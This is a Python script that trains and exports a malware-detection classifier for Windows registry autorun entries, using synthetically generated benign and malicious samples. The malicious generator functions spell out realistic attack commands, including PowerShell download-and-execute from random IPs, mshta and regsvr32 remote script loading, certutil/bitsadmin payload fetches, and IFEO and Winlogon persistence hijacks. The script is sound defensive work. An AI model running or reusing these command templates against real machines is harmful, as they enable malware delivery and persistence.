"""Train the Sentinel module (Random Forest + XGBoost) and export both to ONNX.

    python train_sentinel.py                 # generated registry entries -> models/sentinel_rf.onnx + sentinel_xgb.onnx
    python train_sentinel.py --extra-csv my_entries.csv    # add your own labelled entries (columns: label,key,data)

Honest evaluation. Registry entries are generated from FAMILIES (a "family" = one way a program or an attacker writes an
entry, e.g. "installed app in Program Files" or "mshta from a URL"). The first run trains on 75% of the families and tests on
the families it has NEVER seen; those numbers are what the report calls `unseen_family_*`. The shipped model is then trained
on all families. Real labelled data always beats generated data: pass --extra-csv with entries from your own PCs / lab VMs.

Needs the training extras only (not shipped in the app):   uv sync --group train
"""
from __future__ import annotations

import argparse
import csv
import json
import random
import time
from pathlib import Path

import numpy as np

import ai_common
import sentinel

HKLM_RUN = r"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
HKCU_RUN = r"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run"
HKCU_ONCE = r"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce"
WOW_RUN = r"HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run"
VENDORS = ["Adobe", "Mozilla", "Google", "Microsoft", "Oracle", "Intel", "NVIDIA", "Realtek", "Dell", "HP", "Lenovo", "Zoom", "Slack", "Dropbox",
           "JetBrains", "VideoLAN", "Notepad++", "7-Zip", "Logitech", "Corsair", "Steam", "Epic Games", "Cisco", "VMware", "Acme Corp", "Contoso"]
PRODUCTS = ["Updater", "Helper", "Agent", "Sync", "Launcher", "Tray", "Service", "Client", "Manager", "Monitor", "Notifier", "Assistant"]
USERS = ["alice", "bob", "student", "admin", "user01", "ali", "sara", "hamza"]
WORDS = ["update", "sync", "backup", "report", "setup", "install", "helper", "service", "driver", "config", "data", "cache", "host"]


def pick(r, xs):
    return xs[r.randrange(len(xs))]


def rname(r, lo=5, hi=11):
    return "".join(r.choice("abcdefghijklmnopqrstuvwxyz0123456789") for _ in range(r.randint(lo, hi)))


def hexname(r):
    return "".join(r.choice("0123456789abcdef") for _ in range(r.randint(8, 14)))


def guid(r):
    h = "".join(r.choice("0123456789ABCDEF") for _ in range(32))
    return "{" + f"{h[:8]}-{h[8:12]}-{h[12:16]}-{h[16:20]}-{h[20:]}" + "}"


def b64blob(r, n=None):
    import base64
    return base64.b64encode(bytes(r.randrange(256) for _ in range(n or r.randint(80, 400)))).decode()


def u16blob(r):
    import base64
    text = pick(r, ["IEX (New-Object Net.WebClient).DownloadString('http://%s/a.ps1')", "Start-Process '%s'", "iwr http://%s/p | iex"]) % (f"{r.randint(11, 250)}.{r.randint(0, 250)}.{r.randint(0, 250)}.{r.randint(1, 250)}")
    return base64.b64encode(text.encode("utf-16-le")).decode()


def ip(r):
    return f"{r.randint(11, 223)}.{r.randint(0, 250)}.{r.randint(0, 250)}.{r.randint(1, 250)}"


def ctx(r, bad: bool, noisy: float = 0.0) -> dict:
    """Optional sequence facts about the writer. They overlap between the two classes on purpose."""
    p = (0.75 if bad else 0.08) + (0.3 * noisy if not bad else -0.2 * noisy)
    return {"unsigned_writer": r.random() < p, "file_missing": r.random() < (0.25 if bad else 0.03 + 0.1 * noisy),
            "no_owner": r.random() < (0.7 if bad else 0.06 + 0.2 * noisy), "burst": r.choice([0, 0, 0, 1, 2]) if not bad else r.choice([0, 1, 2, 3, 6, 9]),
            "new_entry": r.random() < (0.9 if bad else 0.3)}


# ---------------------------------------------------------------- benign families
def app_path(r):
    return f"C:\\Program Files\\{pick(r, VENDORS)}\\{pick(r, PRODUCTS)}\\{pick(r, WORDS)}{pick(r, PRODUCTS)}.exe"


def b_run_app(r):
    return {"key": pick(r, [HKLM_RUN, HKCU_RUN, WOW_RUN]) + "\\" + pick(r, PRODUCTS), "data": f'"{app_path(r)}" {pick(r, ["--background", "/minimized", "-autostart", "--silent", ""])}'.strip()}


def b_run_x86(r):
    return {"key": WOW_RUN + "\\" + pick(r, VENDORS), "data": f'"C:\\Program Files (x86)\\{pick(r, VENDORS)}\\{pick(r, PRODUCTS)}\\{pick(r, WORDS)}.exe" /startup'}


def b_service(r):
    return {"key": r"HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\\" + pick(r, WORDS) + pick(r, PRODUCTS),
            "data": pick(r, [r"C:\Windows\System32\svchost.exe -k netsvcs -p", r"\SystemRoot\System32\drivers\%s.sys" % pick(r, WORDS), f'"{app_path(r)}" --service',
                             r"C:\Windows\system32\svchost.exe -k LocalServiceNetworkRestricted", r"C:\Windows\System32\drivers\%s.sys" % pick(r, WORDS)])}


def b_uninstall(r):
    return {"key": r"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\\" + guid(r),
            "data": pick(r, [f"MsiExec.exe /X{guid(r)}", f'"C:\\Program Files\\{pick(r, VENDORS)}\\unins000.exe"', f'"C:\\Program Files\\{pick(r, VENDORS)}\\Uninstall.exe" /S'])}


def b_shell_open(r):
    return {"key": rf"HKEY_CLASSES_ROOT\.{pick(r, ['txt', 'pdf', 'mp4', 'zip', 'md', 'py'])}\shell\open\command", "data": f'"{app_path(r)}" "%1"'}


def b_app_paths(r):
    return {"key": r"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\\" + pick(r, WORDS) + ".exe", "data": app_path(r)}


def b_winlogon(r):
    k, d = pick(r, [("Shell", "explorer.exe"), ("Userinit", r"C:\Windows\system32\userinit.exe,"), ("Shell", "explorer.exe"), ("Userinit", "C:\\Windows\\system32\\userinit.exe,")])
    return {"key": r"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\\" + k, "data": d}


def b_appdata_app(r):
    u = pick(r, USERS)
    return {"key": HKCU_RUN + "\\" + pick(r, ["OneDrive", "Discord", "Teams", "Spotify", "Telegram", "Slack", "Zoom"]),
            "data": pick(r, [f"C:\\Users\\{u}\\AppData\\Local\\Microsoft\\OneDrive\\OneDrive.exe /background", f'"C:\\Users\\{u}\\AppData\\Local\\Discord\\Update.exe" --processStart Discord.exe',
                             f'"C:\\Users\\{u}\\AppData\\Roaming\\Spotify\\Spotify.exe" --autostart --minimized', f'C:\\Users\\{u}\\AppData\\Local\\Microsoft\\Teams\\Update.exe --processStart "Teams.exe"',
                             f'"C:\\Users\\{u}\\AppData\\Roaming\\Telegram Desktop\\Telegram.exe" -autostart'])}


def b_admin_powershell(r):
    """Hard negative: IT tools do start PowerShell and even bypass the policy, from a trusted folder."""
    return {"key": pick(r, [HKLM_RUN, HKCU_RUN]) + "\\" + pick(r, VENDORS) + "Agent",
            "data": pick(r, [f'powershell.exe -ExecutionPolicy Bypass -File "C:\\Program Files\\{pick(r, VENDORS)}\\{pick(r, PRODUCTS)}\\check.ps1"',
                             f'powershell.exe -NoProfile -WindowStyle Hidden -File "C:\\Program Files\\{pick(r, VENDORS)}\\Agent\\start.ps1"',
                             f'cmd.exe /c start "" "{app_path(r)}"', f'"C:\\Windows\\System32\\cmd.exe" /c "C:\\Program Files\\{pick(r, VENDORS)}\\launch.bat"'])}


def b_rundll_regsvr(r):
    return {"key": pick(r, [HKLM_RUN, HKCU_RUN, r"HKEY_CLASSES_ROOT\CLSID\\" + guid(r) + r"\InprocServer32"]),
            "data": pick(r, [r"rundll32.exe C:\Windows\System32\shell32.dll,Control_RunDLL desk.cpl", f'RunDll32.exe "C:\\Program Files\\{pick(r, VENDORS)}\\{pick(r, WORDS)}.dll",Start',
                             f'regsvr32.exe /s "C:\\Program Files\\{pick(r, VENDORS)}\\{pick(r, WORDS)}.dll"', r"C:\Windows\System32\rundll32.exe C:\Windows\System32\mmsys.cpl,ShowSoundCpl"])}


def b_update_url(r):
    return {"key": r"HKEY_LOCAL_MACHINE\SOFTWARE\\" + pick(r, VENDORS) + r"\Update", "data": pick(r, [f"https://update.{pick(r, VENDORS).lower().replace(' ', '')}.com/check", f"https://download.{pick(r, VENDORS).lower().replace(' ', '')}.com/latest.json",
                                                                                                        f'"{app_path(r)}" --check-url https://update.{pick(r, VENDORS).lower().replace(" ", "")}.com/'])}


def b_config_text(r):
    return {"key": r"HKEY_CURRENT_USER\Software\\" + pick(r, VENDORS) + "\\" + pick(r, PRODUCTS),
            "data": pick(r, [guid(r), f"en-US", f"C:\\Users\\{pick(r, USERS)}\\Documents\\{pick(r, WORDS)}.docx", "1", "0x00000001", f"{r.randint(100, 9999)} ms", "Segoe UI", f"2026-{r.randint(1, 12):02d}-{r.randint(1, 28):02d}",
                             f"C:\\Users\\{pick(r, USERS)}\\AppData\\Local\\{pick(r, VENDORS)}\\cache\\{pick(r, WORDS)}.dat"])}


def b_big_blob_other(r):
    return {"key": r"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\\" + pick(r, ["StreamMRU", "TypedPaths", "ComDlg32", "Shell Folders"]) + "\\" + pick(r, WORDS), "data": f"[entropy {r.uniform(7.3, 7.99):.2f} of 8, {r.randint(300, 20000)} bytes]"}


def b_env_paths(r):
    return {"key": pick(r, [HKLM_RUN, HKCU_RUN]) + "\\" + pick(r, PRODUCTS), "data": pick(r, [r"%ProgramFiles%\\" + f"{pick(r, VENDORS)}\\{pick(r, WORDS)}.exe", r"%SystemRoot%\system32\SecurityHealthSystray.exe", r"%windir%\system32\ctfmon.exe",
                                                                                         f'"%ProgramFiles(x86)%\\{pick(r, VENDORS)}\\{pick(r, WORDS)}.exe" /tray'])}


def b_ifeo_benign(r):
    return {"key": r"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\\" + pick(r, WORDS) + ".exe", "data": pick(r, ["0x00000002", "1", "0x0000000a", "3"])}


def b_policy(r):
    return {"key": r"HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\\" + pick(r, ["WindowsUpdate", "System", "Explorer", "Defender"]), "data": pick(r, ["1", "0", "0x00000001", "enabled"])}


BENIGN = {f.__name__: f for f in [b_run_app, b_run_x86, b_service, b_uninstall, b_shell_open, b_app_paths, b_winlogon, b_appdata_app, b_admin_powershell,
                                  b_rundll_regsvr, b_update_url, b_config_text, b_big_blob_other, b_env_paths, b_ifeo_benign, b_policy]}


# ---------------------------------------------------------------- malicious families
def m_ps_enc(r):
    return {"key": pick(r, [HKCU_RUN, HKLM_RUN, HKCU_ONCE]) + "\\" + pick(r, ["Updater", "WindowsUpdate", "Java", "Sync", rname(r)]),
            "data": f"powershell.exe {pick(r, ['-nop -w hidden', '-NoP -NonI -W Hidden', '-w hidden -ep bypass', ''])} {pick(r, ['-enc', '-EncodedCommand', '-e'])} {u16blob(r)}".replace("  ", " ")}


def m_ps_iex(r):
    u = f"http://{ip(r)}/{rname(r, 3, 6)}.{pick(r, ['ps1', 'txt', 'png'])}"
    return {"key": pick(r, [HKCU_RUN, HKLM_RUN]) + "\\" + pick(r, WORDS),
            "data": pick(r, [f"powershell -nop -w hidden -c \"IEX ((New-Object Net.WebClient).DownloadString('{u}'))\"", f"powershell.exe -ep bypass -w hidden -c iwr {u} | iex",
                             f"powershell -w 1 -c \"$c=(New-Object System.Net.WebClient).DownloadString('{u}');Invoke-Expression $c\"", f"pwsh -nop -c \"iex(irm {u})\""])}


def m_mshta(r):
    u = f"http://{pick(r, [ip(r), rname(r) + '.xyz', rname(r) + '.top'])}/{rname(r, 3, 6)}.hta"
    return {"key": pick(r, [HKCU_RUN, HKCU_ONCE]) + "\\" + rname(r), "data": pick(r, [f"mshta {u}", f"mshta.exe {u}", 'mshta vbscript:Execute("CreateObject(""Wscript.Shell"").Run ""powershell -w hidden"",0:close")', f"mshta javascript:a=GetObject('script:{u}').Exec();close()"])}


def m_regsvr_sct(r):
    u = f"http://{pick(r, [ip(r), rname(r) + '.club'])}/{rname(r, 3, 6)}.sct"
    return {"key": HKCU_RUN + "\\" + rname(r), "data": f"regsvr32 /s /n /u /i:{u} scrobj.dll"}


def m_rundll_js(r):
    return {"key": HKCU_RUN + "\\" + rname(r), "data": pick(r, ['rundll32.exe javascript:"\\..\\mshtml,RunHTMLApplication ";document.write();new%20ActiveXObject("WScript.Shell").Run("powershell -w hidden",0)',
                                                                  f"rundll32 {ip(r)}\\share\\{rname(r)}.dll,Start", f"rundll32.exe C:\\Users\\Public\\{rname(r)}.dll,{rname(r, 4, 7)}"])}


def m_script_from_temp(r):
    u = pick(r, USERS)
    return {"key": pick(r, [HKCU_RUN, HKLM_RUN]) + "\\" + pick(r, WORDS),
            "data": pick(r, [f"wscript.exe //B //E:vbscript C:\\Users\\{u}\\AppData\\Local\\Temp\\{rname(r)}.vbs", f"cscript //nologo C:\\Users\\Public\\{rname(r)}.js",
                             f"wscript C:\\ProgramData\\{rname(r)}\\{rname(r)}.vbe", f"cmd /c start /min C:\\Users\\{u}\\AppData\\Roaming\\{rname(r)}.bat"])}


def m_lolbin_download(r):
    u = f"http://{ip(r)}/{rname(r, 3, 6)}.exe"
    return {"key": pick(r, [HKCU_RUN, HKCU_ONCE]) + "\\" + rname(r),
            "data": pick(r, [f"cmd /c certutil -urlcache -split -f {u} %TEMP%\\{rname(r)}.exe && %TEMP%\\{rname(r)}.exe", f"bitsadmin /transfer j /download /priority high {u} C:\\Users\\Public\\{rname(r)}.exe",
                             f"cmd.exe /c curl.exe -s {u} -o %APPDATA%\\{rname(r)}.exe & start %APPDATA%\\{rname(r)}.exe", f"msiexec /q /i http://{ip(r)}/{rname(r)}.msi"])}


def m_odd_folder_exe(r):
    u = pick(r, USERS)
    return {"key": pick(r, [HKCU_RUN, HKLM_RUN]) + "\\" + pick(r, ["Windows Defender Update", "Realtek Audio", "Java Update", "Intel Graphics", rname(r)]),
            "data": pick(r, [f"C:\\Users\\Public\\Libraries\\{rname(r)}.exe", f"C:\\ProgramData\\{rname(r)}\\{rname(r)}.exe", f"C:\\Windows\\Temp\\{rname(r)}.exe",
                             f"C:\\Users\\{u}\\AppData\\Roaming\\Microsoft\\Windows\\{rname(r)}.exe", f"C:\\Users\\{u}\\Downloads\\{pick(r, ['invoice', 'setup', 'crack', 'keygen'])}_{r.randint(1, 99)}.exe",
                             f"%APPDATA%\\{rname(r)}\\{rname(r)}.exe -s", f"%TEMP%\\{hexname(r)}.exe"])}


def m_typosquat(r):
    n = pick(r, ["scvhost", "svch0st", "svchosts", "lsasss", "csrs", "explorer", "expl0rer", "winlogin", "spoolsvc", "taskhosts", "smss1", "servces"])
    return {"key": pick(r, [HKCU_RUN, HKLM_RUN]) + "\\" + n, "data": pick(r, [f"C:\\Users\\Public\\{n}.exe", f"C:\\ProgramData\\{n}.exe", f"C:\\Windows\\{n}.exe", f"C:\\Users\\{pick(r, USERS)}\\AppData\\Local\\Temp\\{n}.exe"])}


def m_fileless_mz(r):
    return {"key": pick(r, [HKCU_RUN, r"HKEY_CURRENT_USER\Software\\" + rname(r) + "\\" + rname(r), r"HKEY_LOCAL_MACHINE\SOFTWARE\\" + rname(r)]),
            "data": pick(r, ["[MZ program, %d bytes]" % r.randint(20000, 600000), f"[MZ program stored inside the value, {r.randint(8000, 400000)} bytes, entropy {r.uniform(6.8, 7.9):.1f}]"])}


def m_blob_in_run(r):
    return {"key": pick(r, [HKCU_RUN, HKLM_RUN]) + "\\" + rname(r), "data": f"[entropy {r.uniform(7.2, 7.99):.2f} of 8, {r.randint(2000, 90000)} bytes]"}


def m_b64_cmd(r):
    return {"key": HKCU_RUN + "\\" + rname(r), "data": pick(r, [f"cmd /c echo {b64blob(r)} | certutil -decode - %TEMP%\\a.exe", f"powershell -c \"[System.Reflection.Assembly]::Load([Convert]::FromBase64String('{b64blob(r, 300)}'))\"",
                                                                  f"mshta vbscript:Execute(\"x='{b64blob(r, 120)}'\")"])}


def m_ifeo_debugger(r):
    t = pick(r, ["sethc.exe", "utilman.exe", "osk.exe", "narrator.exe", "magnify.exe", "displayswitch.exe", "atbroker.exe"])
    return {"key": r"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\\" + t,
            "value": "Debugger", "data": pick(r, [r"C:\Windows\System32\cmd.exe", r"C:\Windows\System32\cmd.exe /c start powershell.exe", f"C:\\Users\\Public\\{rname(r)}.exe", r"C:\Windows\System32\mshta.exe http://%s/x.hta" % ip(r)])}


def m_appinit(r):
    return {"key": r"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows\AppInit_DLLs", "data": pick(r, [f"C:\\Users\\Public\\{rname(r)}.dll", f"C:\\ProgramData\\{rname(r)}.dll", f"C:\\Windows\\Temp\\{rname(r)}.dll"])}


def m_winlogon_extra(r):
    k, d = pick(r, [("Userinit", r"C:\Windows\system32\userinit.exe,%s"), ("Shell", r"explorer.exe,%s")])
    return {"key": r"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\\" + k,
            "data": d % pick(r, [f"C:\\Users\\Public\\{rname(r)}.exe", f"C:\\ProgramData\\{rname(r)}.exe", f"powershell -w hidden -c iex(iwr http://{ip(r)}/a)"])}


def m_wmic_forfiles(r):
    return {"key": pick(r, [HKCU_RUN, HKCU_ONCE]) + "\\" + rname(r), "data": pick(r, [f'wmic process call create "C:\\Users\\Public\\{rname(r)}.exe"', f'forfiles /p c:\\windows\\system32 /m notepad.exe /c "cmd /c C:\\ProgramData\\{rname(r)}.exe"',
                                                                                         f"InstallUtil.exe /logfile= /LogToConsole=false /U C:\\Users\\Public\\{rname(r)}.exe", f"MSBuild.exe C:\\Users\\Public\\{rname(r)}.xml"])}


def m_obf_ps(r):
    u = ip(r)
    return {"key": HKCU_RUN + "\\" + rname(r), "data": pick(r, [f"powershell -nop -c \"$a=[char]105+[char]101+[char]120; & $a (iwr http://{u}/a)\"", "powershell I`E`X (N`ew-O`bject Net.W`ebC`lient).Down`loadStr`ing('http://%s/a')" % u,
                                                                  f"powershell -w hidden -c \"$s='Down'+'load'+'String'; iex (New-Object Net.WebClient).$s('http://{u}/a')\""])}


MALICIOUS = {f.__name__: f for f in [m_ps_enc, m_ps_iex, m_mshta, m_regsvr_sct, m_rundll_js, m_script_from_temp, m_lolbin_download, m_odd_folder_exe, m_typosquat,
                                     m_fileless_mz, m_blob_in_run, m_b64_cmd, m_ifeo_debugger, m_appinit, m_winlogon_extra, m_wmic_forfiles, m_obf_ps]}
HARD_BENIGN = {"b_admin_powershell", "b_appdata_app", "b_rundll_regsvr", "b_update_url", "b_big_blob_other"}


def build(families: dict, label: int, per_family: int, r: random.Random):
    rows = []
    for name, fn in families.items():
        for _ in range(per_family):
            item = fn(r)
            item.update(ctx(r, bool(label), noisy=1.0 if name in HARD_BENIGN else 0.0))
            rows.append((label, name, item))
    return rows


def to_xy(rows):
    return np.stack([sentinel.featurize(i) for _, _, i in rows]), np.asarray([y for y, _, _ in rows], dtype=np.int64)


def fit(X, y, seed):
    from sklearn.ensemble import RandomForestClassifier
    from xgboost import XGBClassifier

    rf = RandomForestClassifier(n_estimators=120, max_depth=14, min_samples_leaf=2, class_weight={0: 1.5, 1: 1.0}, n_jobs=2, random_state=seed).fit(X, y)
    xgb = XGBClassifier(n_estimators=140, max_depth=5, learning_rate=0.1, subsample=0.9, colsample_bytree=0.9, scale_pos_weight=0.7,
                        eval_metric="logloss", n_jobs=2, random_state=seed).fit(X, y)
    return rf, xgb


def metrics(rf, xgb, X, y):
    p = (rf.predict_proba(X)[:, 1] + xgb.predict_proba(X)[:, 1]) / 2
    pred = (p >= 0.5).astype(int)
    tp = int(((pred == 1) & (y == 1)).sum())
    fn = int(((pred == 0) & (y == 1)).sum())
    fp = int(((pred == 1) & (y == 0)).sum())
    tn = int(((pred == 0) & (y == 0)).sum())
    return {"recall": round(tp / max(tp + fn, 1), 4), "false_alarm_rate": round(fp / max(fp + tn, 1), 4), "accuracy": round((tp + tn) / len(y), 4), "n": int(len(y))}


def export(rf, xgb, out: Path):
    from onnxmltools.convert import convert_xgboost
    from onnxmltools.convert.common.data_types import FloatTensorType as XFloat
    from skl2onnx import convert_sklearn
    from skl2onnx.common.data_types import FloatTensorType

    out.mkdir(parents=True, exist_ok=True)
    m = convert_sklearn(rf, initial_types=[("features", FloatTensorType([None, sentinel.NF]))], options={id(rf): {"zipmap": False}}, target_opset={"": 17, "ai.onnx.ml": 3})
    (out / "sentinel_rf.onnx").write_bytes(m.SerializeToString())
    xm = convert_xgboost(xgb, initial_types=[("features", XFloat([None, sentinel.NF]))], target_opset=15)
    (out / "sentinel_xgb.onnx").write_bytes(xm.SerializeToString())


def read_csv(path: Path):
    rows = []
    with open(path, newline="", encoding="utf-8") as f:
        for rec in csv.DictReader(f):
            rows.append((int(rec["label"]), "csv", {"key": rec.get("key", ""), "data": rec.get("data", "")}))
    return rows


def main(argv=None) -> dict:
    ap = argparse.ArgumentParser()
    ap.add_argument("--per-family", type=int, default=260)
    ap.add_argument("--seed", type=int, default=7)
    ap.add_argument("--out", default=str(ai_common.BUNDLED_DIR))
    ap.add_argument("--extra-csv", action="append", default=[])
    a = ap.parse_args(argv)
    r = random.Random(a.seed)
    out = Path(a.out)

    ben = build(BENIGN, 0, a.per_family, r)
    mal = build(MALICIOUS, 1, a.per_family, r)
    extra = [row for p in a.extra_csv for row in read_csv(Path(p))]

    # 1) honest test: hold out whole families
    fam_b, fam_m = sorted(BENIGN), sorted(MALICIOUS)
    hold = set(r.sample(fam_b, max(3, len(fam_b) // 4))) | set(r.sample(fam_m, max(4, len(fam_m) // 4)))
    train_rows = [x for x in ben + mal if x[1] not in hold] + extra
    test_rows = [x for x in ben + mal if x[1] in hold]
    Xtr, ytr = to_xy(train_rows)
    Xte, yte = to_xy(test_rows)
    rf, xgb = fit(Xtr, ytr, a.seed)
    seen_idx = r.sample(range(len(Xtr)), min(800, len(Xtr)))
    held = metrics(rf, xgb, Xte, yte)
    seen = metrics(rf, xgb, Xtr[seen_idx], ytr[seen_idx])
    print(f"unseen families {sorted(hold)}\n  held-out: {held}\n  in-family (train sample): {seen}")

    # 2) shipped model: all families
    Xall, yall = to_xy(ben + mal + extra)
    rf, xgb = fit(Xall, yall, a.seed)
    export(rf, xgb, out)
    # check the exported files give the same answers as the Python models
    import importlib
    ai_common.BUNDLED_DIR, ai_common.SYNCED_DIR = out, out / "_none_"
    importlib.reload(sentinel)
    probe = to_xy(ben[:40] + mal[:40])[0]
    ref = (rf.predict_proba(probe)[:, 1] + xgb.predict_proba(probe)[:, 1]) / 2
    got = np.asarray([x["prob"] for x in sentinel.predict_batch([{"key": i[2]["key"], "data": i[2]["data"], **{k: v for k, v in i[2].items() if k not in ("key", "data")}} for i in ben[:40] + mal[:40]])])
    drift = float(np.abs(ref - got).max())
    print(f"ONNX vs scikit-learn/XGBoost max difference: {drift:.4f}")
    report = {"trained_at": time.time(), "seed": a.seed, "families_benign": len(BENIGN), "families_malicious": len(MALICIOUS), "samples": int(len(yall)),
              "unseen_family_recall": held["recall"], "unseen_family_false_alarm_rate": held["false_alarm_rate"], "unseen_family_accuracy": held["accuracy"],
              "in_family_accuracy": seen["accuracy"], "unseen_families": sorted(hold), "onnx_max_drift": round(drift, 5), "note": "generated data; add real entries with --extra-csv"}
    ai_common.write_manifest({"sentinel_rf.onnx": {**report, "sha256": ai_common.sha256_of(out / "sentinel_rf.onnx")},
                              "sentinel_xgb.onnx": {**report, "sha256": ai_common.sha256_of(out / "sentinel_xgb.onnx")}}, out)
    return report


if __name__ == "__main__":
    main()
